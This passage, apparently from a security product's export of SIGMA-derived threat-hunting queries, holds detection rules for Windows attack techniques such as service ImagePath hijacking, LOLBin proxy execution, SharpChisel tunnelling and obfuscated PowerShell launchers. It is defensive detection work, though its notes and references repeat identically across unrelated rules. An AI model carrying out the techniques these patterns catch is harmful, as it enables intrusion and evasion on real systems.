            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\splwow64.exe\" and tgt.process.cmdline contains \"splwow64.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1031
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode.\nRestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\nThis prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "RestrictedAdminMode Registry Value Tampering - ProcCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\System\\CurrentControlSet\\Control\\Lsa\\\" and tgt.process.cmdline contains \"DisableRestrictedAdmin\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1032
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of \"BgInfo.exe\" which could be a sign of potential abuse of the binary to proxy execution via external VBScript",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1218",
                "t1202"
            ],
            "name": "Suspicious Child Process Of BgInfo.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\bginfo.exe\" or src.process.image.path contains \"\\bginfo64.exe\") and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \"\\AppData\\Local\\\" or tgt.process.image.path contains \"\\AppData\\Roaming\\\" or tgt.process.image.path contains \":\\Users\\Public\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \":\\Windows\\Temp\\\" or tgt.process.image.path contains \":\\PerfLogs\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1033
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of Gpg4win to encrypt files",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "File Encryption Using Gpg4win",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\gpg.exe\" or tgt.process.image.path contains \"\\gpg2.exe\") or tgt.process.displayName=\"GnuPG\u2019s OpenPGP tool\") and (tgt.process.cmdline contains \" -c \" and tgt.process.cmdline contains \"passphrase\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1034
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Use of hostname to get information",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1082"
            ],
            "name": "Suspicious Execution of Hostname",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\HOSTNAME.EXE\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1035
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of scheduled tasks that involves a temporary folder and runs only once",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Suspicious Scheduled Task Creation Involving Temp Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \" /create \" and tgt.process.cmdline contains \" /sc once \" and tgt.process.cmdline contains \"\\Temp\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1036
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child processes of \"DefaultPack.EXE\" binary as a proxy to launch other programs",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Uncommon Child Process Of Defaultpack.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\DefaultPack.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1037
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) child process",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055",
                "t1036"
            ],
            "name": "Suspicious Child Process Of Wermgr.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\wermgr.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\ipconfig.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\netstat.exe\" or tgt.process.image.path contains \"\\nslookup.exe\" or tgt.process.image.path contains \"\\powershell_ise.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\wscript.exe\")) and (not (tgt.process.image.path contains \"\\rundll32.exe\" and (tgt.process.cmdline contains \"C:\\Windows\\system32\\WerConCpl.dll\" and tgt.process.cmdline contains \"LaunchErcApp \") and (tgt.process.cmdline contains \"-queuereporting\" or tgt.process.cmdline contains \"-responsepester\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1038
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Dism Remove Online Package",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\DismHost.exe\" and (src.process.cmdline contains \"/Online\" and src.process.cmdline contains \"/Disable-Feature\")) or (tgt.process.image.path contains \"\\Dism.exe\" and (tgt.process.cmdline contains \"/Online\" and tgt.process.cmdline contains \"/Disable-Feature\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1039
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564",
                "t1564"
            ],
            "name": "Detect Virtualbox Driver Installation OR Starting Of VMs",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"VBoxRT.dll,RTR3Init\" or tgt.process.cmdline contains \"VBoxC.dll\" or tgt.process.cmdline contains \"VBoxDrv.sys\") or (tgt.process.cmdline contains \"startvm\" or tgt.process.cmdline contains \"controlvm\"))) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1040
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the Sharp Chisel via the commandline arguments",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090"
            ],
            "name": "HackTool - SharpChisel Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\SharpChisel.exe\" or tgt.process.displayName=\"SharpChisel\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1041
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Potential Privilege Escalation via Service Permissions Weakness",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.integrityLevel in (\"Medium\",\"S-1-16-8192\")) and (tgt.process.cmdline contains \"ControlSet\" and tgt.process.cmdline contains \"services\") and (tgt.process.cmdline contains \"\\ImagePath\" or tgt.process.cmdline contains \"\\FailureCommand\" or tgt.process.cmdline contains \"\\ServiceDll\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1042
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services.\nAdversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.\nWindows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Changing Existing Service ImagePath Value Via Reg.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"add \" and tgt.process.cmdline contains \"SYSTEM\\CurrentControlSet\\Services\\\" and tgt.process.cmdline contains \" ImagePath \")) and (tgt.process.cmdline contains \" -d \" or tgt.process.cmdline contains \" /d \" or tgt.process.cmdline contains \" \u2013d \" or tgt.process.cmdline contains \" \u2014d \" or tgt.process.cmdline contains \" \u2015d \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1043
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Shells Spawn by Java Utility Keytool",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\keytool.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\scrcons.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\hh.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\" or tgt.process.image.path contains \"\\mftrace.exe\" or tgt.process.image.path contains \"\\AppVLP.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\query.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1044
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Use NTFS Short Name in Command Line",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"~1.exe\" or tgt.process.cmdline contains \"~1.bat\" or tgt.process.cmdline contains \"~1.msi\" or tgt.process.cmdline contains \"~1.vbe\" or tgt.process.cmdline contains \"~1.vbs\" or tgt.process.cmdline contains \"~1.dll\" or tgt.process.cmdline contains \"~1.ps1\" or tgt.process.cmdline contains \"~1.js\" or tgt.process.cmdline contains \"~1.hta\" or tgt.process.cmdline contains \"~2.exe\" or tgt.process.cmdline contains \"~2.bat\" or tgt.process.cmdline contains \"~2.msi\" or tgt.process.cmdline contains \"~2.vbe\" or tgt.process.cmdline contains \"~2.vbs\" or tgt.process.cmdline contains \"~2.dll\" or tgt.process.cmdline contains \"~2.ps1\" or tgt.process.cmdline contains \"~2.js\" or tgt.process.cmdline contains \"~2.hta\") and (not ((src.process.image.path contains \"\\WebEx\\WebexHost.exe\" or src.process.image.path contains \"\\thor\\thor64.exe\") or tgt.process.cmdline contains \"C:\\xampp\\vcredist\\VCREDI~1.EXE\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1045
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated use of Environment Variables to execute PowerShell",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation VAR+ Launcher",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline matches \"cmd.{0,5}(?:/c|/r)(?:\\\\s|)\\\\\"set\\\\s[a-zA-Z]{3,6}.*(?:\\\\{\\\\d\\\\}){1,}\\\\\\\\\\\\\"\\\\s+?\\\\-f(?:.*\\\\)){1,}.*\\\\\"\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1046
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to the PowerShell execution policy registry key in order to bypass signing requirements for script execution from the CommandLine",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential PowerShell Execution Policy Tampering - ProcCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
